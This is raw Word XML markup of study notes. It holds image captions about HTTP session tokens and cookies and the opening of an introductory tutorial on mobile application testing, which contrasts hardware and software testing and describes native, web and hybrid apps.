                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00661BC1" w:rsidRDefault="00661BC1" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pP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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3832860" cy="2876927"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="35" name="Picture 35" descr="HTTP session token &lt;ul&gt;&lt;li&gt;The reason to use session tokens is that the client only has to handle the identifier—all ses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 session token &lt;ul&gt;&lt;li&gt;The reason to use session tokens is that the client only has to handle the identifier—all sess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6938" cy="2879988"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D236F4" w:rsidRDefault="00D236F4" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D236F4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>https://www.slideshare.net/LenaDSS/cookies-and-sessions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC3F7A" w:rsidRDefault="00BC3F7A" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3621474" cy="2718262"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="48" name="Picture 48" descr="Sessions advantages &lt;ul&gt;&lt;li&gt;Your server-side cookie can contain very large amounts of data with no hassle - client-side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ssions advantages &lt;ul&gt;&lt;li&gt;Your server-side cookie can contain very large amounts of data with no hassle - client-side c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1474" cy="2718262"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w: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rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRP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Style w:val="Strong"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction to Mobile Application Testing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB3DF2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Gone are the days when the telephone used to be an appliance that sat in a corner and had to ring to get our attention or a computer was a machine only a few people used – they are now an extension of our being- a window to the world and virtual servants that do as they are told. Computers were a rage and changed how we humans thought, behaved, learnt and existed.</w:t>
      </w:r>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Fonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Mobile technology and smart devices are the trend now and will change the future of the world as we know it. We all can vouch for it, can’t we? Now, it will be amateurish if I list what we use these mobile devices for. You all know it – Maybe better than we do. J</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRP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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A4372B2" wp14:editId="4893E1AB">
            <wp:extent cx="4617720" cy="2811780"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="54" name="Picture 54" descr="mobile application testing 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bile application testing 1">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7720" cy="2811780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>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369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="268" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="269" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let’s get straight to what this tutorial is going to be about.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="270" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="271" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This tutorial will be both an introduction and your guide to Mobile Testing. So, read through!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="toctitle"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="272" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="273" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>What You Will Learn: </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/beginners-guide-to-mobile-application-testing/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>show</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="274" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="275" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of Mobile Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="276" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="277" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>There are broadly 2 kinds of testing that take place on mobile devices:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="278" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="279" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>#1.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Hardware testing:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="280" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="281" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The device including the internal processors, internal hardware, screen sizes, resolution, space or memory, camera, radio, Bluetooth, WIFI etc. This is sometimes referred to as, simple “</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mobile Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>”.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="004C463C" w:rsidRDefault="004C463C" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="282" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="283" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>#2.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Software or Application testing:</w:t>
        </w:r>
      </w:ins>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ins w:id="284" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The applications that work on mobile devices and their functionality are tested. It is called the “</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mobile Application Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>” to differentiate it from the earlier method. Even in the mobile applications, there are few basic differences that are important to understanding:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="285" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="286" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Native apps:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> A native application is created for use on a platform like mobile and tablets.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="287" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Mobile web apps</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> are server-side apps to access website/s on mobile using different browsers like Chrome, Firefox by connecting to a mobile network or wireless network like WIFI.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="288" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Hybrid apps</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> are combinations of native app and web app. They run on devices or offline and are written using web technologies like HTML5 and CSS.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:ins w:id="289"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290" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="291" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>There are few basic differences that set these apart:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="292" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="293" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Native apps have single platform affinity while mobile web apps have the cross-platform affinity.</w:t>
        </w:r>
      </w:ins>
    </w:p>
